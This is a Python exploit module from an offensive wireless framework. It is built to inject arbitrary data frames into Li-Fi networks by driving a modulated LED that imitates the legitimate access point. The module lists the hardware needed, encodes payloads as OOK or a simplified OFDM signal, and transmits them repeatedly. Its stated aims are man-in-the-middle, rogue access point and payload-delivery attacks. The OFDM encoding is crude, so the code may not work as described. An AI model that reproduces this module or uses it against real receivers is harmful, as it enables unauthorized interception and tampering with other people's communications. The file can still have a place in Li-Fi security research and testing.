# Author: André Henrique (LinkedIn/X: @mrhenrike)
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Li-Fi Data Injection via Modulated LED.

    Li-Fi receivers demodulate any optical signal within their
    acceptance angle and wavelength sensitivity.  By transmitting
    a modulated LED signal that mimics the legitimate Li-Fi
    access point, an attacker can inject arbitrary data frames
    into the Li-Fi channel.

    This enables man-in-the-middle attacks, malicious payload
    delivery, and spoofed access point attacks on Li-Fi networks.

    Hardware requirements:
    - LED matched to target Li-Fi wavelength (e.g., 450nm blue
      LED for pureLiFi, or broadband white LED)
    - High-speed LED driver with PWM: e.g., FPGA (Xilinx Artix-7
      or Lattice iCE40) + DAC for OFDM, or simple MOSFET driver
      for OOK modulation
    - For OOK: Arduino/STM32 + MOSFET + LED (up to ~1 Mbps)
    - For OFDM: FPGA + DAC + LED driver (up to ~100 Mbps)
    - Lens/optics for directing the beam at the receiver

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Li-Fi Data Injection via Modulated LED",
        "description": (
            "Injects arbitrary data into Li-Fi channels by transmitting "
            "modulated LED signals that mimic the legitimate access "
            "point.  Requires LED matched to target wavelength, "
            "high-speed driver (Arduino/STM32 for OOK up to 1 Mbps, "
            "or FPGA + DAC for OFDM up to 100 Mbps), and optics "
            "for beam directing.  Enables MitM, payload delivery, "
            "and rogue AP attacks on Li-Fi networks."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://ieeexplore.ieee.org/document/9755267",
            "https://standards.ieee.org/ieee/802.11bb/10823/",
        ),
        "disclosure_date": "2023-06-01",
        "platform": "linux",
        "arch": "all",
        "privileged": False,
        "targets": (
            "Li-Fi receivers within line-of-sight",
            "IEEE 802.11bb OOK and OFDM Li-Fi systems",
        ),
    }

    target = OptIP("", "Target Li-Fi receiver or network description")
    port = OptPort(1, "Not used (optical injection)")
    timeout = OptFloat(10.0, "Injection duration in seconds")
    led_device = OptString("/dev/ttyUSB0", "LED driver serial device or 'simulate'")
    modulation = OptString("ook", "Modulation: ook, ofdm")
    data_rate_bps = OptInteger(100000, "Target data rate in bits/sec")
    payload = OptString("INJECTED_FRAME", "Data payload to inject")
    wavelength = OptInteger(450, "LED wavelength in nm")
    repeat_count = OptInteger(10, "Number of times to repeat the injection")

    def _encode_ook(self, data: bytes) -> bytes:
        """Encode data as OOK (On-Off Keying) bit stream."""
        bit_stream = bytearray()
        preamble = bytes([0xAA, 0xAA, 0xAA, 0xAA])
        sync = bytes([0x7E])

        for b in preamble + sync + data:
            for shift in range(7, -1, -1):
                bit = (b >> shift) & 1
                bit_stream.append(255 if bit else 0)
        return bytes(bit_stream)

    def _encode_ofdm(self, data: bytes) -> bytes:
        """Encode data as simplified OFDM symbol stream."""
        symbols = bytearray()
        subcarriers = 64
        cp_len = 16

        for i in range(0, len(data), subcarriers // 2):
            chunk = data[i:i + subcarriers // 2]
            symbol = bytearray(subcarriers)
            for j, b in enumerate(chunk):
                symbol[j * 2] = b
                symbol[j * 2 + 1] = (~b) & 0xFF
            cp = symbol[-cp_len:]
            symbols.extend(cp)
            symbols.extend(symbol)
        return bytes(symbols)

    def _transmit(self, modulated: bytes) -> bool:
        """Send modulated signal to LED driver."""
        if str(self.led_device) == "simulate":
            return True
        try:
            with open(str(self.led_device), "wb") as f:
                f.write(modulated)
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        """Verify LED driver accessibility."""
        if str(self.led_device) == "simulate":
            return True
        try:
            with open(str(self.led_device), "rb"):
                return True
        except OSError:
            return False

    def run(self) -> None:
        print_success(
            f"Li-Fi injection via modulated LED "
            f"({self.modulation}, {self.data_rate_bps} bps, "
            f"{self.wavelength}nm)"
        )
        self._exploit()

    def _exploit(self) -> None:
        payload_bytes = str(self.payload).encode("utf-8")
        print_info(f"Payload: {len(payload_bytes)} bytes")

        mod = str(self.modulation).lower()
        if mod == "ofdm":
            modulated = self._encode_ofdm(payload_bytes)
            print_info(f"OFDM encoded: {len(modulated)} symbols")
        else:
            modulated = self._encode_ook(payload_bytes)
            print_info(f"OOK encoded: {len(modulated)} samples")

        success = 0
        for i in range(int(self.repeat_count)):
            if self._transmit(modulated):
                success += 1
            bit_time = 1.0 / float(self.data_rate_bps) * len(modulated)
            if bit_time > 0:
                time.sleep(min(bit_time, 0.1))

        print_status(f"Transmitted {success}/{self.repeat_count} injection frames")

        if success > 0:
            print_success(
                f"Li-Fi injection complete: {success} frames sent. "
                "Target receiver should process injected data as "
                "legitimate Li-Fi frames."
            )
        else:
            print_error("All injection attempts failed. Check LED driver.")
